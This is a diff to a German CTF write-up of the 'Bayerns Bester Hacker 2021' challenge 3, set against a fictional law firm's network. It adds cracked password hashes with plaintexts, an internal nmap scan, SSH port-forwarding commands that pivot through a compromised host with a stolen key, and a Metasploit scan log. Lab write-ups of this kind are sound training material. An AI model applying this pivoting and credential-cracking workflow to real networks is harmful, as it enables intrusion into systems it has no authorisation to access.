@@ -289,6 +289,74 @@ In der Aufgabe wurde auch nach dem Passwort des **Administrators A. Müller** ge
 Die Passwörter werden dort als ```sha256``` gehashter Salt gespeichert. Der Online-Dienst [Crackstation](https://crackstation.net/) bietet Rainbow-Tabellen an, die den Inhalt problemlos wiederherstellen:
 ![Bayerns Bester Hacker 2021 Challenge 3 - Passwörter](Screenshots/BBH2021C3_Passwoerter-cracked.png)
 
++----+--------------------------+------------------------------------------------------------------+-----------+------------+
+| id | email                    | password                                                         | user      | pass.      |
++----+--------------------------+------------------------------------------------------------------+-----------+------------+
+| 1  | a.mueller@rae-schmitt.de | 4d08daf3c25398332277e0737bc7fe69833511cc890de9bee450e33620d8080e | a.mueller | sugar1818  |
+| 2  | l.maier@rae-schmitt.de   | 3dda3830c024625bfb7765097b59923836a5bb60195b7dc0083b41e0579af586 | l.maier   | saduc      |
+| 3  | e.wolff@rae-schmitt.de   | 02bcf8f94c93f891e5a3e20f14bad808ab3aa2b84be887f5234f45b42c5607da | e.wolff   | feedme27   |
++----+--------------------------+------------------------------------------------------------------+-----------+------------+
+
+##### Flag
+
+```
+Nmap scan report for 192.168.2.134
+Host is up (0.016s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+```
+
+Ports über den Pivot Host auf Arbeitsmaschine tunneln:
+```
+ssh -L 9390:192.168.2.134:21 -i ../Challenge1/ssh.key kayilvggxt@fileshare.rae-schmitt.ddnss.de
+ssh -L 9389:192.168.2.134:3389 -i ../Challenge1/ssh.key kayilvggxt@fileshare.rae-schmitt.ddnss.de
+ssh -L 9391:192.168.2.134:80 -i ../Challenge1/ssh.key kayilvggxt@fileshare.rae-schmitt.ddnss.de
+ssh -L 9392:192.168.2.134:135 -i ../Challenge1/ssh.key kayilvggxt@fileshare.rae-schmitt.ddnss.de
+ssh -L 9393:192.168.2.134:139 -i ../Challenge1/ssh.key kayilvggxt@fileshare.rae-schmitt.ddnss.de
+ssh -L 9394:192.168.2.134:445 -i ../Challenge1/ssh.key kayilvggxt@fileshare.rae-schmitt.ddnss.de
+```
+
+```
+[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-24 20:54 UTC
+[*] Nmap: Nmap scan report for localhost (127.0.0.1)
+[*] Nmap: Host is up (0.00016s latency).
+[*] Nmap: rDNS record for 127.0.0.1: localhost.localdomain
+[*] Nmap: PORT     STATE  SERVICE       VERSION
+[*] Nmap: 9389/tcp open   ms-wbt-server Microsoft Terminal Services
+[*] Nmap: | rdp-ntlm-info:
+[*] Nmap: |   Target_Name: RAE-SCHMITT
+[*] Nmap: |   NetBIOS_Domain_Name: RAE-SCHMITT
+[*] Nmap: |   NetBIOS_Computer_Name: SRVDIENSTE
+[*] Nmap: |   DNS_Domain_Name: rae-schmitt.de
+[*] Nmap: |   DNS_Computer_Name: SrvDienste.rae-schmitt.de
+[*] Nmap: |   DNS_Tree_Name: rae-schmitt.de
+[*] Nmap: |   Product_Version: 10.0.17763
+[*] Nmap: |_  System_Time: 2021-08-24T18:55:48+00:00
+[*] Nmap: | ssl-cert: Subject: commonName=SrvDienste.rae-schmitt.de
+[*] Nmap: | Not valid before: 2021-08-16T04:59:18
+[*] Nmap: |_Not valid after:  2022-02-15T04:59:18
+[*] Nmap: |_ssl-date: 2021-08-24T18:55:50+00:00; -2h00m05s from scanner time.
+[*] Nmap: 9390/tcp open   ftp           FileZilla ftpd (IP blocked)
+[*] Nmap: 9391/tcp open   http          Microsoft IIS httpd 10.0
+[*] Nmap: | http-methods:
+[*] Nmap: |_  Potentially risky methods: TRACE
+[*] Nmap: |_http-server-header: Microsoft-IIS/10.0
+[*] Nmap: |_http-title: Site doesn't have a title (text/html).
+[*] Nmap: 9392/tcp open   msrpc         Microsoft Windows RPC
+[*] Nmap: 9393/tcp open   netbios-ssn   Microsoft Windows netbios-ssn
+[*] Nmap: 9394/tcp open   unknown
+[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Host script results:
+[*] Nmap: |_clock-skew: mean: -2h00m05s, deviation: 0s, median: -2h00m06s
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 56.10 seconds
+```
 
 # Fazit
 
